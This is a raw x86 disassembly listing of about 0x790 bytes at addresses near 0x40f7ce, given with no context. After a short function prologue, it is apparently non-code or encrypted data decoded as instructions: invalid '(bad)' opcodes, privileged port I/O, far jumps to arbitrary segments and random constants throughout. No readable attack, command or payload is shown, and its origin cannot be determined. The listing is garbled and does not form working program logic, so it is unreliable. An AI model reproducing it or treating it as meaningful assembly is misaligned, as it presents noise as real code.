  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0xfcce46f3
  40f7e3:	fld    DWORD PTR [edi+0x7070b55f]
  40f7e9:	mov    ds:0x1d70707d,eax
  40f7ee:	rcl    BYTE PTR [eax-0x664a6ab1],cl
  40f7f4:	call   0x5ec3a8d2
  40f7f9:	cld    
  40f7fa:	into   
  40f7fb:	(bad)  
  40f7fd:	(bad)  
  40f7fe:	jp     0x40f7ec
  40f800:	inc    edi
  40f801:	cld    
  40f802:	shl    DWORD PTR [ebp-0xc],cl
  40f805:	mov    eax,ds:0x8e474d3
  40f80a:	imul   ecx,DWORD PTR [ebx-0x32],0xb
  40f80e:	xor    al,0xb4
  40f810:	mov    al,ds:0x26a52c02
  40f815:	cmp    BYTE PTR [ebx-0x5a],dl
  40f818:	add    al,0xa2
  40f81a:	and    ch,bh
  40f81c:	xchg   esp,eax
  40f81d:	xor    eax,0x7e479f60
  40f822:	or     bh,BYTE PTR [ebx-0x1bf08cc7]
  40f828:	lods   al,BYTE PTR ds:[esi]
  40f829:	sbb    DWORD PTR [ebx+0x7f],edi
  40f82c:	inc    ebp
  40f82d:	retf   
  40f82e:	cmp    BYTE PTR [ecx],0x2d
  40f831:	test   DWORD PTR [edx-0x55],esp
  40f834:	mov    ds:0x46e188a,al
  40f839:	outs   dx,DWORD PTR ds:[esi]
  40f83a:	jno    0x40f898
  40f83c:	call   0x4ff7:0x53c34730
  40f843:	js     0x40f8a6
  40f845:	scas   eax,DWORD PTR es:[edi]
  40f846:	dec    ecx
  40f847:	sub    edi,ebp
  40f849:	xor    eax,0xad3c69ce
  40f84e:	sbb    BYTE PTR [ecx-0x6ca8607a],cl
  40f854:	adc    esi,DWORD PTR [ebx+0x6d4a9342]
  40f85a:	mov    edx,0x73c10473
  40f85f:	fnstsw ax
  40f861:	sti    
  40f862:	xor    bl,bh
  40f864:	push   0xdf4e9ce0
  40f869:	into   
  40f86a:	sub    dl,ah
  40f86c:	lock cmc 
  40f86e:	leave  
  40f86f:	sbb    esi,DWORD PTR [ebp+0x4]
  40f872:	cmp    ebp,esi
  40f874:	jmp    0x52ed:0x83856218
  40f87b:	inc    ebp
  40f87c:	xchg   BYTE PTR [edx],bl
  40f87e:	and    BYTE PTR fs:[edx],0x1b
  40f882:	and    dl,BYTE PTR [eax-0x4d900691]
  40f888:	out    0x2f,eax
  40f88a:	push   cs
  40f88b:	jnp    0x40f8c4
  40f88d:	jle    0x40f877
  40f88f:	rcr    BYTE PTR [edi-0x7dd45801],0x5a
  40f896:	test   DWORD PTR [esi],esp
  40f898:	mov    al,BYTE PTR [esi+0x12052eea]
  40f89e:	sub    DWORD PTR [edi+edi*2+0x57ea3f10],0xf630048b
  40f8a9:	neg    BYTE PTR [ebp-0x79196112]
  40f8af:	xor    DWORD PTR [edx+0x5880d763],edi
  40f8b5:	sbb    eax,0x84e56faa
  40f8ba:	mov    DWORD PTR [ecx+esi*4+0xde8c684],edx
  40f8c1:	lahf   
  40f8c2:	and    ch,bl
  40f8c4:	les    ebp,FWORD PTR [edi]
  40f8c6:	mov    es,edi
  40f8c8:	in     eax,0xd9
  40f8ca:	xchg   esi,eax
  40f8cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8cc:	cmova  ebp,DWORD PTR [edi-0x4a]
  40f8d0:	cmp    DWORD PTR [edx],esp
  40f8d2:	jns    0x40f8e2
  40f8d4:	adc    edx,eax
  40f8d6:	pop    ecx
  40f8d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8d8:	cmp    DWORD PTR [eax+0x69],edi
  40f8db:	out    0xb6,al
  40f8dd:	xor    DWORD PTR [ebx+0x7eea9461],edi
  40f8e3:	sub    esi,DWORD PTR [ecx+0x4f]
  40f8e6:	inc    eax
  40f8e7:	shl    BYTE PTR ds:0xa2e82f73,0xcf
  40f8ee:	sub    bl,BYTE PTR [ebx-0x64e2f8f2]
  40f8f4:	loop   0x40f948
  40f8f6:	or     BYTE PTR es:[esp+edi*4],al
  40f8fa:	fstp   DWORD PTR [ebp+esi*4-0x51236506]
  40f901:	add    BYTE PTR [ecx-0x7e27babb],bl
  40f907:	mov    dh,0x90
  40f909:	jle    0x40f8b9
  40f90b:	scas   eax,DWORD PTR es:[edi]
  40f90c:	mov    ds:0x4817010c,eax
  40f911:	mov    dl,0xa
  40f913:	mov    dh,0x92
  40f915:	and    al,0xce
  40f917:	fcmovne st,st(5)
  40f919:	adc    BYTE PTR [eax+0x24],al
  40f91c:	xor    al,0xc0
  40f91e:	mov    ebp,0xc99ff4ff
  40f923:	pop    ebp
  40f924:	pinsrw mm1,WORD PTR [esp+edx*1-0x57b38fae],0x21
  40f92d:	es imul esi,ebx,0x75
  40f931:	out    dx,eax
  40f932:	test   al,bh
  40f934:	inc    ebp
  40f935:	dec    ecx
  40f936:	add    DWORD PTR [edi],ecx
  40f938:	mov    dh,0x14
  40f93a:	push   ds
  40f93b:	popa   
  40f93c:	sub    eax,0xe73767b8
  40f941:	ror    DWORD PTR [ebp+ecx*2+0x4b],cl
  40f945:	inc    eax
  40f946:	test   al,0xd9
  40f948:	cld    
  40f949:	push   0x7c
  40f94b:	inc    esp
  40f94c:	pop    ebx
  40f94d:	mov    ecx,0xdc42b2ee
  40f952:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f953:	popa   
  40f954:	out    dx,al
  40f955:	fwait
  40f956:	or     BYTE PTR [ebx],cl
  40f958:	push   eax
  40f959:	(bad)  
  40f95a:	push   ecx
  40f95b:	pop    es
  40f95c:	jl     0x40f94c
  40f95e:	push   ss
  40f95f:	push   es
  40f960:	repnz cs div esi
  40f964:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f965:	stc    
  40f966:	and    al,0xc7
  40f968:	pop    ds
  40f969:	jl     0x40f9bd
  40f96b:	cmp    eax,0x35374e43
  40f970:	sbb    ecx,DWORD PTR [edx+0x1c4444da]
  40f976:	popf   
  40f977:	jle    0x40f9c4
  40f979:	addr16 xor ebp,esi
  40f97c:	mov    edi,0x7867deb4
  40f981:	in     eax,0x56
  40f983:	push   ebx
  40f984:	std    
  40f985:	pop    ecx
  40f986:	out    0x93,al
  40f988:	and    esi,DWORD PTR [esi]
  40f98a:	scas   al,BYTE PTR es:[edi]
  40f98b:	jl     0x40f917
  40f98d:	or     ah,bh
  40f98f:	jle    0x40fa09
  40f991:	out    0x4b,eax
  40f993:	outs   dx,BYTE PTR ds:[esi]
  40f994:	inc    edx
  40f995:	fcom   QWORD PTR [ebp-0x1ff6705]
  40f99b:	dec    ebx
  40f99c:	jp     0x40f9f3
  40f99e:	pop    eax
  40f99f:	inc    esp
  40f9a0:	mov    bh,0x63
  40f9a2:	out    0x79,al
  40f9a4:	xor    edi,ecx
  40f9a6:	mov    eax,ds:0x17f342d2
  40f9ab:	cmp    esi,eax
  40f9ad:	ins    DWORD PTR es:[edi],dx
  40f9ae:	fnsave [esi+0x6ce2e8b4]
  40f9b4:	mov    ecx,0xbe0cc50a
  40f9b9:	mov    edi,DWORD PTR [esi-0x5f150abb]
  40f9bf:	mov    eax,0x3655874e
  40f9c4:	popf   
  40f9c5:	int    0x5
  40f9c7:	popf   
  40f9c8:	mov    ebp,0xb91b0826
  40f9cd:	inc    edx
  40f9ce:	(bad)  
  40f9cf:	pushf  
  40f9d0:	jmp    0x65d26e10
  40f9d5:	test   DWORD PTR ds:0x464fd723,esp
  40f9db:	imul   esi,esi,0x71
  40f9de:	dec    ecx
  40f9df:	push   es
  40f9e0:	test   bl,dl
  40f9e2:	xor    cl,BYTE PTR [ecx+ebx*4+0x1a4183c9]
  40f9e9:	cmc    
  40f9ea:	leave  
  40f9eb:	lods   al,BYTE PTR ds:[si]
  40f9ed:	shr    bh,cl
  40f9ef:	pop    ebx
  40f9f0:	pop    esi
  40f9f1:	xchg   ecx,eax
  40f9f2:	jae    0x40f98b
  40f9f4:	mov    bl,0x28
  40f9f6:	pop    edi
  40f9f7:	addr16 cmp edi,0x39c009ba
  40f9fe:	daa    
  40f9ff:	sbb    eax,0x48316c34
  40fa04:	idiv   edx
  40fa06:	fcmovnbe st,st(4)
  40fa08:	xor    esp,DWORD PTR [edx-0x63a4d427]
  40fa0e:	div    DWORD PTR [esi]
  40fa10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa11:	call   FWORD PTR [eax-0x773b3f2]
  40fa17:	fidiv  WORD PTR [eax+0x64]
  40fa1a:	jg     0x40fa82
  40fa1c:	fild   QWORD PTR ds:0x559d3191
  40fa22:	inc    eax
  40fa24:	ret    
  40fa25:	js     0x40fa3c
  40fa27:	test   DWORD PTR [edi],esp
  40fa29:	xchg   esi,eax
  40fa2a:	mov    edi,0x2baa93d3
  40fa2f:	mov    ds:0x35a8d6cf,al
  40fa34:	jae    0x40f9c6
  40fa36:	push   ebx
  40fa37:	dec    ecx
  40fa38:	ins    DWORD PTR es:[edi],dx
  40fa39:	mov    ds:0x5790c5e1,al
  40fa3e:	sub    DWORD PTR [ecx-0x733d1337],edi
  40fa44:	xchg   BYTE PTR [ebx+0x5d535863],ah
  40fa4a:	push   0x40
  40fa4c:	loop   0x40f9e1
  40fa4e:	test   esp,ebx
  40fa50:	jg     0x40fa31
  40fa52:	mov    BYTE PTR [ecx+0x72e10c75],dh
  40fa58:	and    ebp,DWORD PTR [edi+ebx*8+0x5e2cac38]
  40fa5f:	test   eax,0x40e9c54e
  40fa64:	ss jns 0x40fa5a
  40fa67:	mov    DWORD PTR ds:0xa1575c9a,edi
  40fa6d:	test   DWORD PTR [edi+0x618d32a6],esi
  40fa73:	pop    edx
  40fa74:	fimul  DWORD PTR ds:0x16b84fb1
  40fa7a:	shl    BYTE PTR [edx+0x7455d76f],1
  40fa80:	pop    es
  40fa81:	add    al,0x95
  40fa83:	mov    bl,0xc6
  40fa85:	test   eax,0xc5c6230b
  40fa8a:	xchg   BYTE PTR [ebx+0x57f7e15c],ch
  40fa90:	dec    ebp
  40fa91:	pop    edx
  40fa92:	sub    DWORD PTR [edx],ebp
  40fa94:	retf   0x1d16
  40fa97:	mov    ch,0x5d
  40fa99:	jmp    0x40fa23
  40fa9b:	pushf  
  40fa9c:	xor    eax,0xa63503f9
  40faa1:	loope  0x40fb15
  40faa3:	in     eax,0x11
  40faa5:	inc    ebp
  40faa6:	mov    cl,BYTE PTR [edi*1+0x61672310]
  40faad:	ficom  WORD PTR [esi+0x7d]
  40fab0:	les    eax,FWORD PTR [eax+0x2e]
  40fab3:	mov    ah,BYTE PTR [edi]
  40fab5:	xchg   ebp,eax
  40fab6:	xor    edx,DWORD PTR [ebx-0x6f884bcf]
  40fabc:	xor    DWORD PTR [esi+0x70faca67],ecx
  40fac2:	xchg   ecx,eax
  40fac3:	mov    BYTE PTR [ebx+0x10b74ac5],cl
  40fac9:	adc    BYTE PTR [esi+0x69],0x71
  40facd:	pop    esp
  40face:	push   ds
  40facf:	outs   dx,DWORD PTR ds:[esi]
  40fad0:	loopne 0x40fb13
  40fad2:	cmp    BYTE PTR [esi+0x72],al
  40fad5:	ret    0xb00f
  40fad8:	inc    esp
  40fad9:	lahf   
  40fada:	push   ds
  40fadb:	sar    BYTE PTR [eax],1
  40fadd:	push   0x4042cb16
  40fae2:	push   ebx
  40fae3:	sub    bh,BYTE PTR [ecx]
  40fae5:	rcl    DWORD PTR [edi+0x33],0x59
  40fae9:	aas    
  40faea:	and    eax,0xbf92254c
  40faef:	mov    ah,0x3d
  40faf1:	jmp    0x4ad6:0xee970f57
  40faf8:	mov    esi,0xf3f3fa34
  40fafd:	and    DWORD PTR [esi],edx
  40faff:	sbb    DWORD PTR [edx],esi
  40fb01:	call   0xbaaf:0x6e96c721
  40fb08:	mov    ebp,0x650be776
  40fb0d:	test   al,0xf0
  40fb0f:	out    dx,al
  40fb10:	pusha  
  40fb11:	jbe    0x40fb1c
  40fb13:	(bad)  
  40fb14:	(bad)  
  40fb15:	neg    DWORD PTR [edi-0x7b]
  40fb18:	jp     0x40fb36
  40fb1a:	sub    al,0xf1
  40fb1c:	lods   al,BYTE PTR ds:[esi]
  40fb1d:	lds    esp,FWORD PTR [ebx]
  40fb1f:	lds    edi,FWORD PTR [ebp-0x26]
  40fb22:	out    0x38,eax
  40fb24:	xchg   edi,eax
  40fb25:	push   ebx
  40fb26:	(bad)  
  40fb27:	jo     0x40fb9d
  40fb29:	push   ds
  40fb2a:	aas    
  40fb2b:	and    DWORD PTR [ebx+0x4a],ebx
  40fb2e:	inc    edx
  40fb2f:	pop    eax
  40fb30:	adc    al,0x56
  40fb32:	sti    
  40fb33:	les    esi,FWORD PTR [ecx-0x4]
  40fb36:	mov    bl,0x15
  40fb38:	aam    0xc8
  40fb3a:	inc    esp
  40fb3b:	mul    DWORD PTR [eax+0x2d]
  40fb3e:	pop    eax
  40fb3f:	rcr    al,0x51
  40fb42:	add    ah,BYTE PTR [eax*4+0x54d5cd3f]
  40fb49:	retf   
  40fb4a:	out    0x46,eax
  40fb4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb4d:	xchg   ebx,eax
  40fb4e:	mov    esp,0xc4c65d76
  40fb53:	ret    0xcea7
  40fb56:	fsubr  DWORD PTR [ebp+0x27773bc8]
  40fb5c:	jmp    0x7e62:0xed1a96e2
  40fb63:	jl     0x40fb58
  40fb65:	addr16 and eax,0xc62ebeff
  40fb6b:	dec    ebx
  40fb6c:	iret   
  40fb6d:	adc    al,0xfe
  40fb6f:	xor    DWORD PTR [ebp-0x2],edi
  40fb72:	out    0x7d,eax
  40fb74:	jae    0x40fbe1
  40fb76:	mov    bh,0x7e
  40fb78:	hlt    
  40fb79:	loope  0x40fb1b
  40fb7b:	jmp    0x53:0x9fd676b
  40fb82:	lods   eax,DWORD PTR ds:[esi]
  40fb83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb84:	fcom   DWORD PTR ds:0x6797147c
  40fb8a:	lock mov ds:0x90006f11,al
  40fb90:	inc    ebx
  40fb91:	fwait
  40fb92:	ret    0x1502
  40fb95:	(bad)  
  40fb96:	dec    ebp
  40fb97:	mov    cl,BYTE PTR [edi*1+0x241df751]
  40fb9e:	loope  0x40fbe2
  40fba0:	add    cl,ch
  40fba2:	lds    eax,FWORD PTR [ebx]
  40fba4:	add    BYTE PTR [eax],al
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0xd1
  40fbb3:	inc    edi
  40fbb4:	add    BYTE PTR [ebp-0x7e],cl
  40fbb7:	mov    cl,0x70
  40fbb9:	jo     0x40fb5e
  40fbbb:	jge    0x40fc2d
  40fbbd:	jo     0x40fc12
  40fbbf:	and    edx,DWORD PTR [edi]
  40fbc1:	push   es
  40fbc2:	pop    ss
  40fbc3:	in     eax,dx
  40fbc4:	add    DWORD PTR [esi+0x78bec8a6],ecx
  40fbca:	(bad)  
  40fbcc:	inc    eax
  40fbcd:	xlat   BYTE PTR ds:[ebx]
  40fbce:	sub    ecx,DWORD PTR [esi+0xf]
  40fbd1:	mov    bh,0x12
  40fbd3:	pop    edx
  40fbd4:	cmc    
  40fbd5:	push   edx
  40fbd6:	add    DWORD PTR [ebp-0x39],esi
  40fbd9:	jecxz  0x40fb7f
  40fbdb:	out    0x46,eax
  40fbdd:	mov    esp,0x3d78be59
  40fbe2:	std    
  40fbe3:	rcl    DWORD PTR [eax-0x4238784f],0xc5
  40fbea:	int3   
  40fbeb:	cmp    al,0x3b
  40fbed:	xchg   ebp,eax
  40fbee:	mov    esp,0x3ce44c9d
  40fbf3:	dec    eax
  40fbf4:	sub    DWORD PTR [esi],edi
  40fbf6:	jb     0x40fb98
  40fbf8:	xchg   ebx,eax
  40fbf9:	lock std 
  40fbfb:	add    DWORD PTR [edx],ecx
  40fbfd:	jecxz  0x40fbcb
  40fbff:	xchg   ecx,eax
  40fc00:	sub    DWORD PTR [ebx+0x249c93ca],edx
  40fc06:	push   es
  40fc07:	cmp    al,0xa5
  40fc09:	dec    esi
  40fc0a:	je     0x40fc0b
  40fc0c:	test   eax,0x7855c524
  40fc11:	fild   DWORD PTR [edx+0x4e590693]
  40fc17:	push   ss
  40fc18:	push   esp
  40fc19:	jl     0x40fbd4
  40fc1b:	lds    esi,FWORD PTR [esi-0x56]
  40fc1e:	fistp  DWORD PTR [eax+0x1745854c]
  40fc24:	cdq    
  40fc25:	repz das 
  40fc27:	mov    fs,WORD PTR ds:0xed39daf7
  40fc2d:	ins    BYTE PTR es:[edi],dx
  40fc2e:	gs retf 0x38ca
  40fc32:	mov    cx,0x5831
  40fc36:	jns    0x40fc0b
  40fc38:	jbe    0x40fc13
  40fc3a:	or     BYTE PTR [ecx],0x4a
  40fc3d:	leave  
  40fc3e:	div    al
  40fc40:	stc    
  40fc41:	mov    cl,0x4
  40fc43:	adc    eax,DWORD PTR [ebp-0x6c]
  40fc46:	test   DWORD PTR fs:[edx],edx
  40fc49:	cmp    eax,0xd87a6262
  40fc4e:	sbb    ch,ah
  40fc50:	les    edx,FWORD PTR [ecx-0x4a]
  40fc53:	rol    DWORD PTR [ecx],1
  40fc55:	aas    
  40fc56:	sbb    ch,dh
  40fc58:	scas   eax,DWORD PTR es:[edi]
  40fc59:	pop    ss
  40fc5a:	scas   al,BYTE PTR es:[edi]
  40fc5b:	xchg   esp,eax
  40fc5c:	ret    
  40fc5d:	mov    ds:0xec6e6963,al
  40fc62:	int    0xba
  40fc64:	daa    
  40fc65:	outs   dx,DWORD PTR ds:[esi]
  40fc66:	ins    DWORD PTR es:[edi],dx
  40fc67:	pusha  
  40fc68:	retf   0xfab5
  40fc6b:	cmp    DWORD PTR fs:[ebp-0xb98bd06],edi
  40fc72:	in     eax,0xc6
  40fc74:	shl    eax,1
  40fc76:	xor    esi,DWORD PTR [ecx]
  40fc78:	test   al,0x22
  40fc7a:	repnz adc al,0x4f
  40fc7d:	imul   ebx,DWORD PTR [ebx-0x7f491348],0x85da91b6
  40fc87:	imul   ebp,DWORD PTR [esi],0xffffffee
  40fc8a:	je     0x40fcd5
  40fc8c:	(bad)  
  40fc8d:	push   0xffffffea
  40fc8f:	xor    dh,BYTE PTR ds:0xfa60a9a0
  40fc95:	les    ebx,FWORD PTR [eax]
  40fc97:	and    BYTE PTR [esi-0x5f83474f],cl
  40fc9d:	clc    
  40fc9e:	pop    edx
  40fc9f:	(bad)  
  40fca0:	rol    BYTE PTR [edi+0x78a1e9bb],cl
  40fca6:	pushf  
  40fca7:	pop    ebx
  40fca8:	mul    BYTE PTR [edx+ebx*4-0x583d2217]
  40fcaf:	ins    BYTE PTR es:[edi],dx
  40fcb0:	mov    dl,0x83
  40fcb2:	ss jle 0x40fd22
  40fcb5:	pop    edi
  40fcb6:	cmp    DWORD PTR [ebp-0x80],eax
  40fcb9:	std    
  40fcba:	mov    dl,0xb8
  40fcbc:	jecxz  0x40fcfc
  40fcbe:	inc    ebp
  40fcbf:	mov    dh,0xbb
  40fcc1:	xchg   esp,eax
  40fcc2:	stos   DWORD PTR es:[edi],eax
  40fcc3:	inc    edx
  40fcc4:	pop    es
  40fcc5:	mov    esp,0xf040fcad
  40fcca:	cmp    DWORD PTR [ebx-0x1a7bfadf],0x44bfebb6
  40fcd4:	sar    BYTE PTR [esp+edx*2-0x7a57d620],0xc0
  40fcdc:	jno    0x40fd53
  40fcde:	out    0xba,eax
  40fce0:	retf   
  40fce1:	cld    
  40fce2:	dec    ebp
  40fce3:	nop
  40fce4:	pop    esi
  40fce5:	push   0x7216413d
  40fcea:	shr    esi,1
  40fcec:	mov    WORD PTR [esi],fs
  40fcee:	gs dec eax
  40fcf0:	jmp    0x92daaaf2
  40fcf5:	mov    eax,0x3a3268e3
  40fcfa:	leave  
  40fcfb:	mov    ch,0x70
  40fcfe:	adc    esi,edi
  40fd00:	outs   dx,DWORD PTR ds:[esi]
  40fd01:	jmp    0x40fd24
  40fd03:	and    eax,0xd5b6f443
  40fd08:	push   esp
  40fd09:	jb     0x40fd6d
  40fd0b:	loop   0x40fcd5
  40fd0d:	les    esp,FWORD PTR [ebp+0x8]
  40fd10:	jmp    0x7c23:0xf2796f76
  40fd17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd18:	jg     0x40fd0f
  40fd1a:	daa    
  40fd1b:	add    esi,ebp
  40fd1d:	popf   
  40fd1e:	and    DWORD PTR [esi+0x41],edx
  40fd21:	push   cs
  40fd22:	xchg   esi,eax
  40fd23:	ficom  WORD PTR [ebp+esi*4+0x387a16db]
  40fd2a:	push   0xfa4bef5b
  40fd2f:	push   ds
  40fd30:	inc    eax
  40fd31:	mov    DWORD PTR [eax+edx*2+0xdc84380],edx
  40fd38:	sub    ebp,ecx
  40fd3a:	subps  xmm1,XMMWORD PTR [ebp+eiz*2-0x6d4fc43f]
  40fd42:	jmp    0x40fcc4
  40fd44:	sub    edx,edi
  40fd46:	xchg   edx,eax
  40fd47:	mov    al,ds:0x84798cf0
  40fd4c:	xor    ebp,DWORD PTR ds:0x781f38b3
  40fd52:	cmp    al,0x8f
  40fd54:	retf   
  40fd55:	repz push ss
  40fd57:	lds    ebp,FWORD PTR [esi-0x22]
  40fd5a:	pop    eax
  40fd5b:	jb     0x40fd74
  40fd5d:	icebp  
  40fd5e:	xor    DWORD PTR [ecx-0x5f],ebx
  40fd61:	pop    ecx
  40fd62:	(bad)  
  40fd63:	dec    ebp
  40fd64:	int3   
  40fd65:	pop    ss
  40fd66:	add    DWORD PTR [ecx],esp
  40fd68:	imul   ebx
  40fd6a:	les    edi,FWORD PTR [eax+eax*1-0x50]
  40fd6e:	jmp    0x1de95c5c
  40fd73:	inc    ecx
  40fd74:	repnz lods eax,DWORD PTR ds:[esi]
  40fd77:	push   cs
  40fd78:	push   edi
  40fd79:	jmp    0xe054a4dd
  40fd7e:	into   
  40fd7f:	out    dx,al
  40fd80:	jle    0x40fd45
  40fd82:	pop    DWORD PTR [edx-0x7a]
  40fd85:	sbb    eax,0x9c8aa0d
  40fd8a:	out    0x6e,eax
  40fd8c:	mov    gs,esi
  40fd8e:	imul   edx,DWORD PTR [eax+eiz*4-0x5ddfe8e9],0xffffff90
  40fd96:	ret    
  40fd97:	lods   eax,DWORD PTR ds:[esi]
  40fd98:	fwait
  40fd99:	cvtdq2ps xmm6,XMMWORD PTR [ebx-0x419c0d63]
  40fda0:	rcl    al,0x19
  40fda3:	int    0xe6
  40fda5:	fdiv   DWORD PTR [eax]
  40fda7:	or     cl,ch
  40fda9:	aas    
  40fdaa:	out    0xae,al
  40fdac:	loope  0x40fdf0
  40fdae:	add    ch,BYTE PTR [edx+0x5b]
  40fdb1:	pop    ds
  40fdb2:	fisttp QWORD PTR [esi+0x25]
  40fdb5:	sub    DWORD PTR [esi+0x5ca62271],esp
  40fdbb:	enter  0x23d,0x39
  40fdbf:	es push es
  40fdc1:	jne    0x40fe32
  40fdc3:	cmp    al,0x53
  40fdc5:	mov    cl,0xc4
  40fdc7:	jp     0x40fd52
  40fdc9:	ja     0x40fd63
  40fdcb:	dec    edi
  40fdcc:	sub    ebx,DWORD PTR [esi+0x6b]
  40fdcf:	pop    ecx
  40fdd0:	pop    edx
  40fdd1:	in     eax,dx
  40fdd2:	push   ebx
  40fdd3:	or     eax,0xe42c863
  40fdd8:	jg     0x40fe01
  40fdda:	iret   
  40fddb:	cmp    dl,BYTE PTR [edi]
  40fddd:	inc    ecx
  40fdde:	push   ds
  40fddf:	jl     0x40fd92
  40fde1:	inc    ebp
  40fde2:	into   
  40fde3:	jl     0x40fdf9
  40fde5:	xor    al,dh
  40fde7:	inc    edx
  40fde8:	into   
  40fde9:	imul   esp,DWORD PTR [ebx],0xffffff81
  40fdec:	sbb    eax,0xed6aa359
  40fdf1:	and    dh,BYTE PTR [esi+0x4a]
  40fdf4:	pop    ebx
  40fdf5:	and    DWORD PTR ds:0x52404dba,edi
  40fdfb:	xlat   BYTE PTR ds:[ebx]
  40fdfc:	push   edx
  40fdfd:	or     BYTE PTR [ebx+0xfefef6d],ch
  40fe03:	bound  eax,QWORD PTR [ebp-0x65176c6d]
  40fe09:	aas    
  40fe0a:	iret   
  40fe0b:	jmp    0x6b916bd6
  40fe10:	dec    ebx
  40fe11:	daa    
  40fe12:	adc    BYTE PTR [eax+0x1f],0x42
  40fe16:	fsubr  st,st(6)
  40fe18:	sbb    eax,0x6e3caeab
  40fe1d:	add    al,0xe7
  40fe1f:	fst    QWORD PTR ds:0x54cf495e
  40fe25:	mov    bl,0xa4
  40fe27:	and    dh,al
  40fe29:	sbb    al,0xaa
  40fe2b:	jl     0x40feaa
  40fe2d:	adc    eax,0x25eaa59a
  40fe32:	jbe    0x40fdf5
  40fe34:	lock psubq mm6,QWORD PTR [ecx-0x30]
  40fe39:	loopne 0x40fe36
  40fe3b:	adc    edx,ebx
  40fe3d:	inc    edi
  40fe3e:	pusha  
  40fe3f:	xchg   esp,eax
  40fe40:	mov    eax,0xc8f73d1c
  40fe45:	rcr    BYTE PTR [ebx+ebp*8+0x32],1
  40fe49:	push   edi
  40fe4a:	aad    0xf5
  40fe4c:	mov    WORD PTR [eax],es
  40fe4e:	fwait
  40fe4f:	push   eax
  40fe50:	add    BYTE PTR [ebp-0x6320450],0x84
  40fe57:	cwde   
  40fe58:	fwait
  40fe59:	arpl   WORD PTR [ebx+0x69f6bd29],di
  40fe5f:	mov    eax,0x7d27428b
  40fe64:	push   ds
  40fe65:	pop    ebp
  40fe66:	(bad)  
  40fe67:	cmp    BYTE PTR [ebx],dh
  40fe69:	cmp    BYTE PTR [edx-0x2a0743c3],0x48
  40fe70:	pusha  
  40fe71:	les    ebp,FWORD PTR [ecx-0x4c]
  40fe74:	inc    ebp
  40fe75:	pop    edi
  40fe76:	(bad)  
  40fe77:	nop
  40fe78:	mov    dh,0x4f
  40fe7a:	imul   eax,edi,0xa755f3bb
  40fe80:	sub    ebp,edi
  40fe82:	ja     0x40fed8
  40fe84:	jnp    0x40fe56
  40fe86:	jg     0x40fe97
  40fe88:	loopne 0x40fef6
  40fe8a:	pop    edi
  40fe8b:	xor    BYTE PTR [eax-0x52],bl
  40fe8e:	or     dh,BYTE PTR [edi]
  40fe90:	jmp    0x219c:0x5d291770
  40fe97:	mov    eax,0x51066ddc
  40fe9c:	ds dec eax
  40fe9e:	stos   BYTE PTR es:[edi],al
  40fe9f:	xchg   ebp,eax
  40fea0:	jns    0x40fe2c
  40fea2:	cdq    
  40fea3:	nop
  40fea4:	fisubr WORD PTR [eax+0x8]
  40fea7:	adc    DWORD PTR ds:0x178bc2f4,edi
  40fead:	scas   eax,DWORD PTR es:[edi]
  40feae:	das    
  40feaf:	ret    0xefc0
  40feb2:	nop
  40feb3:	out    0x41,al
  40feb5:	fs das 
  40feb7:	es sbb al,0xab
  40feba:	pop    edi
  40febb:	aas    
  40febc:	xchg   esp,eax
  40febd:	fscale 
  40febf:	call   0xdc0ceb95
  40fec4:	push   esi
  40fec5:	(bad)  [edi-0x2006fc1d]
  40fecb:	leave  
  40fecc:	fbld   TBYTE PTR [eax]
  40fece:	out    0xfe,eax
  40fed0:	daa    
  40fed1:	in     al,dx
  40fed2:	and    BYTE PTR [ebp+0x5c],dl
  40fed5:	jno    0x40fe7e
  40fed7:	mov    esi,0x7ae89f9b
  40fedc:	fimul  DWORD PTR [ecx]
  40fede:	fsub   st,st(7)
  40fee0:	jns    0x40fe67
  40fee2:	cli    
  40fee3:	mov    cl,0x61
  40fee5:	loop   0x40ff46
  40fee7:	mov    al,ds:0x2b0a287e
  40feec:	jnp    0x40fe94
  40feee:	pusha  
  40feef:	dec    ebp
  40fef0:	sbb    DWORD PTR [esi-0x931d98a],esi
  40fef6:	ins    BYTE PTR es:[edi],dx
  40fef7:	mov    esp,0x13de4374
  40fefc:	xchg   edx,eax
  40fefd:	push   edx
  40fefe:	xor    DWORD PTR [ecx],ebx
  40ff00:	enter  0x3042,0x8b
  40ff04:	push   ecx
  40ff05:	xchg   ch,bh
  40ff07:	cli    
  40ff08:	cmp    eax,0x96e3a084
  40ff0d:	pop    ecx
  40ff0e:	f2xm1  
  40ff10:	into   
  40ff11:	sbb    DWORD PTR [edx],0xffffff8c
  40ff14:	xor    bh,BYTE PTR [ecx]
  40ff16:	sar    DWORD PTR ds:0x4b88315b,0x2a
  40ff1d:	and    dl,dl
  40ff1f:	not    BYTE PTR [ebx]
  40ff21:	stos   DWORD PTR es:[edi],eax
  40ff22:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40ff24:	mov    ?,edi
  40ff26:	push   edx
  40ff27:	pusha  
  40ff28:	pop    ebp
  40ff29:	lahf   
  40ff2a:	mov    ds:0x2bf1fce4,al
  40ff2f:	sahf   
  40ff30:	push   ds
  40ff31:	test   BYTE PTR [ebp+0x43],al
  40ff34:	js     0x40ff1a
  40ff36:	push   0xfffffff3
  40ff38:	leave  
  40ff39:	out    0xa7,eax
  40ff3b:	mov    al,ds:0xcdce7f11
  40ff40:	adc    bl,bh
  40ff42:	in     eax,0x3c
  40ff44:	and    al,0xd8
  40ff46:	mov    esi,0xdb0e03f
  40ff4b:	or     DWORD PTR [ebp+esi*1-0x69b4d417],ebx
  40ff52:	jnp    0x40ff8d
  40ff54:	cli    
  40ff55:	jecxz  0x40ff55
  40ff57:	or     ecx,esp
  40ff59:	mov    BYTE PTR [ecx-0x75],bl
  40ff5c:	jnp    0x40ff41
